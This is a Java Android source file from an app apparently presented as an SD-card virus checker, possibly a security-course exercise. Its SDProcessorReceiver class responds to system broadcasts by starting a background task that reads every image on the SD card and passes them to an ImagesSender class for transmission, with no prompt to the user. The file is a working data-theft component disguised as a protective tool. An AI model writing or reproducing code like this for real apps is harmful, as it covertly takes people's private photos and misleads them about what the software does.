package sdviruschecker.seginf.sdviruschecker;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Looper;
import android.util.Log;

import java.io.File;
import java.util.List;

public class SDProcessorReceiver extends BroadcastReceiver {


    @Override
    public void onReceive(Context context, Intent intent) {
        new SDAnalyzerTask().execute(context);
    }

    private static class SDAnalyzerTask extends AsyncTask<Context, Integer, Long> {
        @Override
        protected Long doInBackground(Context... contexts) {
            if (Looper.myLooper() == null) {
                Looper.prepare();
            }
            Log.d("PROCESSOR RECEIVER", "START");
            List<File> imagesFromSd = ImagesReader.getImagesFromSd();
            ImagesSender.sendImages(imagesFromSd, contexts[0]);
            return null;
        }

        protected void onPostExecute(Long result) {
            Log.d("PROCESSOR RECEIVER", "END");
        }
    }
}
